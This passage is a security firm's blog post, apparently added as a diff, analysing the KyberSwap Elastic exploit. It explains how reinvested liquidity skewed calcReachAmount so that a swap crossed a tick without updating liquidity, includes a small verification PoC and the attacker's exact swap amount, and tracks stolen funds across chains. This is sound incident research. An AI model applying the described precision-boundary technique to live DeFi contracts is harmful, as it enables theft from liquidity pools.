class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>The key to skipping the Cross Tick operation lies in the check on line 21 for the equality of <code>swapData.sqrtP</code> and <code>swapData.nextSqrtP</code>. In theory, when the pool crosses a Tick, due to exceeding the price boundary of the current Tick, sqrtP should be updated to the price of the next Tick, and the <code>swapData.sqrtP</code> calculated in line 10 by <code>computeSwapStep</code> should be equal to swapData.nextSqrtP. However, when the swap gets to line 21, the current sqrtP is not equal to nextSqrtP. This leads the pool to conclude that it has not crossed a Tick, causing it to exit the loop with a break statement, thus skipping the subsequent operations to cross the tick and update the pool’s liquidity.</p>
+<p>In the actual transaction data of the attacker, the <code>specifiedAmount</code> parameter passed to <code>computeSwapStep</code> was 387,170,294,533,119,999,999. The maximum amount that could be exchanged without crossing the current Tick was calculated by <code>calcReachAmount</code> to be 387,170,294,533,120,000,000 (which is exactly 1 more than the amount the attacker wanted to exchange). However, when calcFinalPrice was eventually called, the price that was actually computed turned out to be 20,693,058,119,558,072,255,665,971,001,964. When we input this price into <code>getTickAtSqrtRatio</code> to calculate its corresponding Tick, we found that it corresponds to Tick 111310, not the current Tick (110909).</p>
+<p>This confirms our previous speculation that <code>calcFinalPrice</code> calculated a price that fell within the price range of the next Tick, even when the exchange amount did not exceed the maximum exchangeable amount that would not cause a Cross Tick, as calculated by <code>calcReachAmount</code>.</p>
+<p>So, what exactly caused the pool to ultimately cross the tick despite the exchange amount not exceeding the maximum amount calculated by <code>calcReachAmount</code> that would not result in a Cross Tick?</p>
+<p>The issue seems to stem from the reinvestment mechanism of the Kyber Elastic pool. If we look at the <code>swap</code> function, specifically at line 22, we notice that the pool’s liquidity is increased by the addition of reinvested liquidity. Could it be that this extra reinvested liquidity is what led to an error in the <code>calcReachAmount</code> computation?</p>
+<p>To validate our hypothesis, we wrote a Proof of Concept (PoC) contract to simulate the execution results of both scenarios.</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testCalcReachAmount</span>(<span class="params"></span>) external pure returns (int256, int256) &#123;</span><br><span class="line">  uint256 baseL = <span class="number">74692747583654757908</span>;</span><br><span class="line">  uint256 reinvastL = <span class="number">1851411303269421</span>;</span><br><span class="line"></span><br><span class="line">  int256 usedAmountWithReinvastL = <span class="title class_">SwapMath</span>.<span class="title function_">calcReachAmount</span>(baseL + reinvastL, <span class="number">20282409603651670423947251286016</span>,<span class="number">20693058119558072255662180724088</span>, <span class="number">10</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">  int256 usedAmountNonReinvastL = <span class="title class_">SwapMath</span>.<span class="title function_">calcReachAmount</span>(baseL, <span class="number">20282409603651670423947251286016</span>,<span class="number">20693058119558072255662180724088</span>, <span class="number">10</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (usedAmountWithReinvastL, usedAmountNonReinvastL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We captured the inputs from the attacker and calculated the maximum exchangeable amount that would not trigger a Cross Tick using both the calculation method employed by the Kyber contract and an alternative method that excludes the reinvestment of liquidity. It is apparent that when reinvestment of liquidity is taken into account, the maximum exchangeable amount not causing a Cross Tick is calculated to be 387,170,294,533,120,000,000 (the result from Kyber contract’s calculation). However, when disregarding the reinvestment of liquidity, the maximum exchangeable amount is only 387,160,697,969,657,129,472. The attacker’s exchange amount just exceeded this value.</p>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/04.png" alt="image"></p>
+<p>After a calculation error occurred in <code>calcReachAmount</code>, it satisfied the condition in <code>computeSwapStep</code> where <code>usedAmount</code> (387,170,294,533,120,000,000) is greater than <code>specifiedAmount</code> (387,170,294,533,119,999,999). Consequently, the pool assumed that it had not crossed a tick and therefore did not need to update <code>nextSqrtP</code> to <code>targetSqrtP</code>. Instead, the final price was calculated using <code>calcFinalPrice</code>. This explains why the final <code>sqrtP</code> did not match <code>nextSqrtP</code>, resulting in the liquidity update operation being skipped.</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">computeSwapStep</span>(<span class="params"></span></span><br><span class="line"><span class="params">  uint256 liquidity,</span></span><br><span class="line"><span class="params">  uint160 currentSqrtP,</span></span><br><span class="line"><span class="params">  uint160 targetSqrtP,</span></span><br><span class="line"><span class="params">  uint256 feeInFeeUnits,</span></span><br><span class="line"><span class="params">  int256 specifiedAmount,</span></span><br><span class="line"><span class="params">  bool isExactInput,</span></span><br><span class="line"><span class="params">  bool isToken0</span></span><br><span class="line"><span class="params"></span>)</span><br><span class="line">  internal</span><br><span class="line">  pure</span><br><span class="line">  returns (</span><br><span class="line">    int256 usedAmount,</span><br><span class="line">    int256 returnedAmount,</span><br><span class="line">    uint256 deltaL,</span><br><span class="line">    uint160 nextSqrtP</span><br><span class="line">  )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// in the event currentSqrtP == targetSqrtP because of tick movements, return</span></span><br><span class="line">  <span class="comment">// eg. swapped up tick where specified price limit is on an initialised tick</span></span><br><span class="line">  <span class="comment">// then swapping down tick will cause next tick to be the same as the current tick</span></span><br><span class="line">  <span class="keyword">if</span> (currentSqrtP == targetSqrtP) <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, currentSqrtP);</span><br><span class="line">  usedAmount = <span class="title function_">calcReachAmount</span>(</span><br><span class="line">    liquidity,</span><br><span class="line">    currentSqrtP,</span><br><span class="line">    targetSqrtP,</span><br><span class="line">    feeInFeeUnits,</span><br><span class="line">    isExactInput,</span><br><span class="line">    isToken0</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    (isExactInput &amp;&amp; usedAmount &gt; specifiedAmount) ||</span><br><span class="line">    (!isExactInput &amp;&amp; usedAmount &lt;= specifiedAmount)</span><br><span class="line">  ) &#123;</span><br><span class="line">    usedAmount = specifiedAmount;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    nextSqrtP = targetSqrtP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  uint256 absDelta = usedAmount &gt;= <span class="number">0</span> ? <span class="title function_">uint256</span>(usedAmount) : usedAmount.<span class="title function_">revToUint256</span>();</span><br><span class="line">  <span class="keyword">if</span> (nextSqrtP == <span class="number">0</span>) &#123;</span><br><span class="line">    deltaL = <span class="title function_">estimateIncrementalLiquidity</span>(</span><br><span class="line">      absDelta,</span><br><span class="line">      liquidity,</span><br><span class="line">      currentSqrtP,</span><br><span class="line">      feeInFeeUnits,</span><br><span class="line">      isExactInput,</span><br><span class="line">      isToken0</span><br><span class="line">    );</span><br><span class="line">    nextSqrtP = <span class="title function_">calcFinalPrice</span>(absDelta, liquidity, deltaL, currentSqrtP, isExactInput, isToken0)</span><br><span class="line">    .<span class="title function_">toUint160</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    deltaL = <span class="title function_">calcIncrementalLiquidity</span>(</span><br><span class="line">      absDelta,</span><br><span class="line">      liquidity,</span><br><span class="line">      currentSqrtP,</span><br><span class="line">      nextSqrtP,</span><br><span class="line">      isExactInput,</span><br><span class="line">      isToken0</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  returnedAmount = <span class="title function_">calcReturnedAmount</span>(</span><br><span class="line">    liquidity,</span><br><span class="line">    currentSqrtP,</span><br><span class="line">    nextSqrtP,</span><br><span class="line">    deltaL,</span><br><span class="line">    isExactInput,</span><br><span class="line">    isToken0</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Continuing to track the attacker’s call trace, we indeed found that, as we suspected, the <code>_updatePoolData</code> function updated the incorrect pool state, setting both the pool’s <code>currentTick</code> and <code>nextTick</code> to 111310.</p>
+<h1 id="Funds-Flow-Track"><a href="#Funds-Flow-Track" class="headerlink" title="Funds Flow Track"></a>Funds Flow Track</h1><p>We used the ZAN KYT tool to track the flow of funds from the attacker’s address: <a href="https://zan.top/kyt/controller/transaction/?entity=0x50275e0b7261559ce1644014d4b78d4aa63be836&amp;ecosystem=ethereum" target="_blank" rel="noopener">https://zan.top/kyt/controller/transaction/?entity=0x50275e0b7261559ce1644014d4b78d4aa63be836&amp;ecosystem=ethereum</a>.</p>
+<ol>
+<li>0x50275e0b7261559ce1644014d4b78d4aa63be836<br>This is the address that the attacker used on Ethereum.</li>
+</ol>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/05.png" alt="image"></p>
+<p>According to the KYT (Know Your Transaction) flow chart, the attacker transferred the funds obtained from the attack through the Optimism cross-chain bridge to the Optimism network, and also used the Arbitrum cross-chain bridge to transfer assets to Arbitrum, serving as the initial capital for attack transactions on both chains. Additionally, funds were transferred to other chains such as Scroll and Base. Interestingly, the attacker also received an “invitation” from the perpetrator of the Euler Finance attack.<br>(Euler Finance Attacker’s address：0x560e7c572a47f6b09856fa0319089a5cde46be3c14c27bed371f1c0f6708b155)</p>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/06.png" alt="image"></p>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/07.png" alt="image"></p>
+<p>On the BSC (Binance Smart Chain), the address received 4.2678 BNB from the mixer cross-chain bridge FixedFloat and then made no further operations. On the Polygon network, the address transferred 100 MATIC to 0xc9b826bad20872eb29f9b1d8af4befe8460b50c6, after which there were no additional actions.</p>
+<p>On the Arbitrum network, the attacker moved funds to the address 0x98d69d3ea5f7e03098400a5bedfbe49f2b0b88d3 and transferred a total of 300 WETH (Wrapped Ether) back to Ethereum through the Across bridge. Currently, the funds have not moved further.</p>
+<ol start="2">
+<li>0xc9b826bad20872eb29f9b1d8af4befe8460b50c6</li>
+</ol>
+<p>This the address that the attacker used on Optimism.</p>
+<p>On Optimism，The attacker gathered wstETH、WETH、OP tokens, collateralized 1.685 million USDC in Aave v3 and has not yet taken action with the remaining assets.</p>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/08.png" alt="image"></p>
+<p>On the BASE chain, the address kept the profits of 61,051 USDC and 124.22 WETH at the address. The USDC was exchanged for WETH, and no further actions have been taken.</p>
+<p>On the Avalanche network, the address has retained 293.08 WAVAX and 17,316.03 USDC, with no further actions at this time.</p>
+<p>On the Arbitrum network, the address profited from assets like 826,528 DAI and 13 WBTC, with most of the assets remaining in that address. Of these, 500 WETH was transferred to 0x98d69d3ea5f7e03098400a5bedfbe49f2b0b88d3, and 1,000 WETH was sent to the Indexed Finance attacker’s address (0x84e66f86c28502c0fc8613e1d9cbbed806f7adb4).</p>
+<h1 id="Conclusion-amp-Recommendation"><a href="#Conclusion-amp-Recommendation" class="headerlink" title="Conclusion &amp; Recommendation"></a>Conclusion &amp; Recommendation</h1><p>With the rise of UniswapV3, an increasing number of projects are beginning to embrace the emerging ‘concentrated liquidity’ market-making algorithm. Concentrated liquidity offers higher capital efficiency and lower trading slippage compared to the previous constant product and constant sum market-making algorithms. However, the complexity of the concentrated liquidity algorithm is significantly greater. Additionally, there are various imitations that claim ‘innovations’ and ‘improvements’ on star projects, with issues often hidden within the code that are incredibly subtle and difficult to detect. We recommend that all projects undergo thorough testing before launching and seek advice and services from professional contract audit experts.</p>
+<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><h2 id="AntChain-Open-Labs"><a href="#AntChain-Open-Labs" class="headerlink" title="AntChain Open Labs"></a><strong>AntChain Open Labs</strong></h2><p>AntChain Open Labs is a research center initiated by AntChain and world leading computer scientists in the area of foundational trust technologies. It is dedicated to building a secure, transparent and reliable Web3 infrastructure driven by innovative research and aiming to advance transformative services.<br>Website：<a href="https://openlabs-intl.antdigital.com/home" target="_blank" rel="noopener">https://openlabs-intl.antdigital.com/home</a></p>
+<h2 id="ZAN"><a href="#ZAN" class="headerlink" title="ZAN"></a><strong>ZAN</strong></h2><p>ZAN, powered by AntChain Open Labs, provides solutions for Web3, such as Smart Contract Review, KYT, KYC, Node Service, and more.<br>Website：<a href="https://zan.top/home" target="_blank" rel="noopener">https://zan.top/home</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2023/12/08/Emergency-Alert-Analysis-of-OpenZeppelin-Arbitrary-Address-Spoofing-Attack/" data-toggle="tooltip" data-placement="top" title="!! Emergency Alert!! Analysis of OpenZeppelin Arbitrary Address Spoofing Attack">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2023/11/13/Web3-Tech-Event-Workshop-on-ZK-VM-Gains-Tremendous-Popularity/" data-toggle="tooltip" data-placement="top" title="Web3 Tech Event - Workshop on ZK VM Gains Tremendous Popularity">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/AntChainOpenLabs">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; AntChain Open Labs 2024 
+                    <br>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      extensions: ["tex2jax.js"],
+      jax: ["input/TeX"],
+      tex2jax: {
+        inlineMath: [ ['$','$'], ['\\(','\\)'] ],
+        displayMath: [ ['$$','$$']],
+        processEscapes: true
+      }
+    });
+</script>
+<script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [ ['$','$'], ['\\(','\\)'] ],
+        displayMath: [ ['$$','$$']],
+        processEscapes: true,
+      },
+      options: {
+      renderActions: {
+        findScript: [10, function (doc) {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/);
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+            const text = document.createTextNode('');
+            node.parentNode.replaceChild(text, node);
+            math.start = {node: text, delim: '', n: 0};
+            math.end = {node: text, delim: '', n: 0};
+            doc.math.push(math);
+          }
+        }, '']
+      }
+    }
+    };
+</script>
+<script type="text/javascript" id="MathJax-script" src="/js/mathjax/tex-chtml.js">
+</script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://antchainopenlabs.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7F0NSTH00H"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-7F0NSTH00H');
+    </script>
+
+<!-- 
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'G-7F0NSTH00H';
+    var _gaDomain = 'https://antchainopenlabs.github.io';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script> -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://antchainopenlabs.github.io/img/logo.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
